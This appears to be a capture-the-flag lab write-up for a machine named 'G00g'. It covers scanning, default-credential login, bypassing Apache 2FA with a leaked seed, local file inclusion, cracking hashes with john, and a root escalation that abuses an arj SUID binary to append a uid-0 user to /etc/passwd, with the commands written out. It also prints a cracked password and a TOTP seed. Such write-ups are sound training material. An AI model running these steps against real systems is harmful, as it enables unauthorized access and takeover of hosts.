---
icon: ubuntu
---

# G00g - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.144 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 22:40 EDT
Nmap scan report for 192.168.209.144
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
|_  256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.38
|_http-server-header: Apache/2.4.38 (Debian)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   29.85 ms 192.168.45.1
2   29.77 ms 192.168.45.254
3   29.89 ms 192.168.251.1
4   30.44 ms 192.168.209.144
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (258).png" alt=""><figcaption></figcaption></figure>

Port 80 uses default admin:admin creds. Logging in we are meet with this

<figure><img src="../../.gitbook/assets/image (259).png" alt=""><figcaption></figcaption></figure>

The Page source code comments reveals a hidden directory

<figure><img src="../../.gitbook/assets/image (260).png" alt=""><figcaption></figcaption></figure>

Googling this leads to some Apache 2FA thing using Google Authenticator. Fount this at this [**git repo**](https://github.com/itemir/apache_2fa)

<figure><img src="../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

Within the Google Authenticator App, we can click the plus sign in the bottom right corner:

<figure><img src="../../.gitbook/assets/image (263).png" alt=""><figcaption></figcaption></figure>

We can then enter the key we found on that repo

<figure><img src="../../.gitbook/assets/image (264).png" alt=""><figcaption></figcaption></figure>

After adding this, we would get a OTP every 30 seconds as with normal Google Authenticator

<figure><img src="../../.gitbook/assets/image (265).png" alt=""><figcaption></figcaption></figure>

Keying in this 2FA token grants us access to the web page:

<figure><img src="../../.gitbook/assets/image (262).png" alt=""><figcaption></figcaption></figure>

Clicking on Run then View results we see the following

<figure><img src="../../.gitbook/assets/image (266).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">LFI</mark>

This website is vulnerable to LFI

<figure><img src="../../.gitbook/assets/image (267).png" alt=""><figcaption></figcaption></figure>

There weren't any SSH keys to read for the `fox` user. However, the Github repo did mention that there is an `apache_credentials` file somewhere on this machine

After some searching, I found in within the `/opt` directory

<figure><img src="../../.gitbook/assets/image (268).png" alt=""><figcaption></figcaption></figure>

I'll try to crack them using john

### <mark style="color:$primary;">Cracking Hashes</mark>

```bash
john hashes -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (269).png" alt=""><figcaption></figcaption></figure>

```
fox:THERESE
```

We cannot SSH in&#x20;

<figure><img src="../../.gitbook/assets/image (270).png" alt=""><figcaption></figcaption></figure>

The user has 2FA too! So we need to steal the `tokens.json` file as well.

<figure><img src="../../.gitbook/assets/image (271).png" alt=""><figcaption></figcaption></figure>

```
RTW2ARWLJZRWUCN54UO22FDQ6I
```

Now let's add the following key to Google Authenticator the same way as above.

<figure><img src="../../.gitbook/assets/image (241).png" alt=""><figcaption></figcaption></figure>

Note! if you wait to long you have to Key in the 2FA token for the website

Now let's input the password and then the Verification key from Google Authenticator to login

<figure><img src="../../.gitbook/assets/image (242).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (244).png" alt=""><figcaption></figcaption></figure>

Linpeas reaveals an interesting SUID

### <mark style="color:$primary;">arj SUID -> \[add a new user to /etc/passwd]</mark>

[**GTFObins**](https://gtfobins.github.io/gtfobins/arj/#suid) has an easy privesc method for this

<figure><img src="../../.gitbook/assets/image (243).png" alt=""><figcaption></figcaption></figure>

Let's add a new root user!

First I will generate a new passwd file with our new user and hash, then overwrite it using `arj`

```bash
openssl passwd -1 deimos123
```

<figure><img src="../../.gitbook/assets/image (245).png" alt=""><figcaption></figcaption></figure>

```bash
cp /etc/passwd passwd
echo 'ez:$1$yoiajNk/$ww3P22anAVFbkV83EHDm5.:0:0::/root:/bin/bash' >> passwd
arj a "passwd" "passwd"
arj e "passwd.arj" "/etc"
```

<figure><img src="../../.gitbook/assets/image (246).png" alt=""><figcaption></figcaption></figure>

and we are root!
